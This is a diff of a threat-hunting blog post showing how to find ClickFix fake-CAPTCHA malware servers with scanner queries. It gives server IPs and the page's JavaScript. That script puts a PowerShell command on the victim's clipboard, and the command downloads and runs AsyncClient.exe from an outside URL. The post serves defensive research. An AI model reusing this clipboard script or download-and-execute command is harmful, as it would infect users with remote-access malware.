@@ -55,6 +55,10 @@ For this type of job I'll used tool & information that related to URL, Domain, a
 - [Validin](https://www.validin.com/)
 - [URLScan.io](https://urlscan.io/)
 - [AnyRun](https://any.run/)
+- [Censys](https://censys.com/)
+- [Shodan](https://www.shodan.io/)
+- [ZoomEye](https://www.zoomeye.ai/)
+- [Fofa](https://en.fofa.info/)
 
 ### Obtain intial lead or seed information - Collection
 
@@ -141,15 +145,72 @@ Or from [Lumma Stealer ClickFix](https://www.silentpush.com/blog/lumma-stealer/)
 
 ![Lumma Stealer ClickFix](/assets/img/clickfix_copypaste_lumma.png)
 
-These Copy-Paste has **embeded a javascript contain a powershell script** and always has a **Control (CTRL) + C** and **Control (CTRL) + V** and the **Press Windows Button** which quite a UIL in my opinion
+These Copy-Paste has
+* The **embeded a javascript contain a powershell script** 
+* The **Control (CTRL) + C** and **Control (CTRL) + V** 
+* The **Press Windows Button** or **Windows + R** which quite a UIL in my opinion.
+* The **Robot or Human** or **I'm not a robot**
+
+Let's use Internet Scanner tools for these type of search, let's search for the HTML content 
+
+```shell
+services.http.response.body: "Windows + R" or "Verification Steps" or "CTRL + V" or "Ctrl + V" or "Windows Key" and "powershell"
+```
+Or you can search each of the term one by one in order to have more granular information
+
+We found a server that has: 
+* IP Address: **66.248.206.135**
+* Query: **services.http.response.body: "Windows + R"** 
 
 
-So let's start from it
+
+
+We also found another server: 
+
+* IP Address: **196.251.113.41**
+* HTML Title / Banner: **reCAPTCHA Verification**
+* Port Sequence: 80, 135, ,139, 443, 445, 3306, 5985, 47001 
+* Query: **(services.http.response.body:"Verification Steps") and services.port=`443`**
+* Host: `https://search.censys.io/hosts/196.251.113.41`
+
+Example Screenshot: 
+
+![ClickFix Check Robot](/assets/img/clickfix_check_robot.png)
+
+![ClickFix ReCaptcha](/assets/img/clickfix_server_recaptcha.png)
+
+![ClickFix Powershell Script](/assets/img/clickfix_server_ps_script.png)
+
+```javascript
+        document.getElementById("checkbox").addEventListener("click", function() {
+            let verifyWindow = document.getElementById("verify-window");
+            verifyWindow.classList.add("show");
+            generateRandomID();
+        });
+
+        function generateRandomID() {
+            let randomID = Math.floor(100000 + Math.random() * 900000);
+            document.getElementById("verification-id").innerText = randomID;
+            copyPayload(randomID);
+        }
+
+        function copyPayload(id) {
+            const payload = `powershell -Command Invoke-WebRequest -Uri 'https://2ur.jp/NJgY' -OutFile $env:USERPROFILE\\AsyncClient.exe; Start-Process -FilePath $env:USERPROFILE\\AsyncClient.exe -Wait # ✅ ''I am not a robot - reCAPTCHA Verification ID: ${id}''`;
+            navigator.clipboard.writeText(payload).then(() => {
+                console.log("Payload copied to clipboard with ID:", id);
+            }).catch(err => {
+                console.error("Clipboard copy failed: ", err);
+            });
+        }    
+```
+
+We found another domain: **hxxps://2ur[.]jp/NJgY** which will download a **AsycnClient.exe**, We will use URLScan.io to scan this domain you can access this link [https://urlscan.io/result/17cf8a96-fad0-47a3-b018-e0436b877f12/#transactions](https://urlscan.io/result/17cf8a96-fad0-47a3-b018-e0436b877f12/#transactions)
+
+Which it will redirect to **hxxps://196.251.113[.]41/AsyncClient.exe** 
 
 **Captcha Page**
 
-Fake-Captcha page also their main thing to fake and deliver their malware
-
+Fake-Captcha page also their main thing to fake and deliver their malware, as you can see from the above example 
 
 **Google Related Pages**
 
